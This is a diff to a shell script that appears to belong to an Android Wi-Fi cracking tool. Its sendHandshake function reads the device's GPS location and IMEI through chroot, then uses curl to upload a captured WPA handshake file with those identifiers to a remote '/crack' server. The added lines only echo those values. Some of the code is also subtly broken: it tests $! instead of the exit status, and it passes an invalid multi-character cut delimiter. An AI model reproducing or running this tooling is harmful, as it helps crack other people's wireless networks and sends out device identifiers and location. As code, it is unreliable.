@@ -12,15 +12,17 @@ checkUtils() {
     echo "cp cap2hccapx.bin /bin"
     exit 1
   fi
-
 }
 
 sendHandshake() {
  # echo $1
  # echo $2
   long=`chroot /proc/1/cwd/ dumpsys location|grep "LongitudeDegrees: " | cut -d " |," -f13`
+  echo "Long: "$long
   lat=`chroot /proc/1/cwd/ dumpsys location|grep "LatitudeDegrees: " | cut -d " |," -f13`
+  echo "Lat: "$lat
   imei=`chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]'`
+  echo "IMEI: "$imei
   curl -i -X POST -H "imei: $imei" -H "lon: $long" -H "lat: $lat" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/crack
   if [[ $! == 0 ]]; then
     rm $1
